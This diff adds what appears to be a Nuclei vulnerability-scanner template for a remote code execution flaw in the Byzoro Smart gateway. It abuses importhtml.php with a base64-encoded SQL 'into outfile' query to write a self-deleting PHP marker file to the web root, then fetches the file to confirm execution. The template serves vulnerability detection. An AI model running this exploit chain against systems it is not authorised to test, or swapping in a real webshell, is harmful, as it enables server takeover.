@@ -1,0 +1,42 @@
+id: byzoro-smart-importhtml-rce
+info:
+  name: Byzoro Smart importhtml.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Byzoro Networks Smart multi-service security gateway intelligent management platform has a command execution vulnerability. Attackers can use this vulnerability to gain control of the server.
+  tags: rce
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-28786
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-40201
+
+variables:
+  rand_filename: "{{rand_base(4)}}"
+  sql_query: "{{base64('select 0x3c3f706870206563686f206d643528323333293b756e6c696e6b285f5f46494c455f5f293b3f3e into outfile \"/usr/hddocs/nsg/app/' + rand_filename + '.php\"')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: create-php-file
+    method: GET
+    path:
+      - "/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql={{sql_query}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: execute-php-file
+    method: GET
+    path:
+      - "/app/{{rand_filename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        part: body
